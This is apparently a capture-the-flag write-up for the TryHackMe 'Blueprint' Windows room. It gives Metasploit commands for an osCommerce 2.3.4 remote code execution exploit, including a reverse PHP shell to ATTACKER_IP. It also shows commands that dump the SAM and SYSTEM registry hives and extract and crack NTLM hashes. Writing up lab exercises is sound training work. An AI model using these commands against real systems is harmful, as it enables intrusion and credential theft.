# [Blueprint](https://tryhackme.com/room/blueprint)

## Hack into this Windows machine and escalate your privileges to Administrator

### "Lab" user NTLM hash decrypted

1. First scan ports with nmap to identify available services

```bash
nmap IP
```

![SCREEN01](https://github.com/user-attachments/assets/183da63e-a847-4526-bf77-9b66a3487800)

2. After exploring the services, navigate to `https://<TARGET_IP>:443`. Here we discover an `oscommerce-2.3.4` directory. Online research indicated that this version has a remote code execution vulnerability that can be exploited using Metasploit

```bash
msfconsole
use exploit/multi/http/oscommerce_installer_unauth_code_exec
show options
set URI /oscommerce-2.3.4/catalog/install
set PAYLOAD php/reverse_php
set SSL true
set RHOSTS TARGET_IP
set RPORT 443
set LHOST ATTACKER_IP
set LPORT 4444
run

whoami
```

![SCREEN02](https://github.com/user-attachments/assets/fb565cb4-1111-4d8e-b882-d2c1872c89da)

3. Navigate to the web application directory and extract the Windows registry hives containing password data

```bash
cd C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
reg.exe save hklm\sam SAM
reg.exe save hklm\security SECURITY
reg.exe save hklm\system SYSTEM
```

![SCREEN03](https://github.com/user-attachments/assets/53e640ca-22c7-4810-9b8b-5c9cd7b9cee2)

```bash
samdump2 SYSTEM SAM
```

4. Download the registry hive files from the web server by accessing `https://IP/oscommerce-2.3.4/catalog/install/includes/`

5. Once downloaded to your attack machine, use `samdump2` to extract the password hashes

```bash
samdump2 SYSTEM SAM
```

![SCREEN04](https://github.com/user-attachments/assets/e68a4936-45c0-444d-9618-07bce61fd657)

6. Copy the NTLM hash for the "Lab" user and paste it into [CrackStation](https://crackstation.net/) to decode it

![SCREEN05](https://github.com/user-attachments/assets/980c12ab-82b6-473a-96e3-00e2bf847c4d)

---

### root.txt

1. We can directly access the Administrator directory

```bash
cd C:\Users\Administrator\Desktop
dir
type root.txt.txt
```

![SCREEN06](https://github.com/user-attachments/assets/326939c1-4d75-4045-afe7-784f6af0b377)
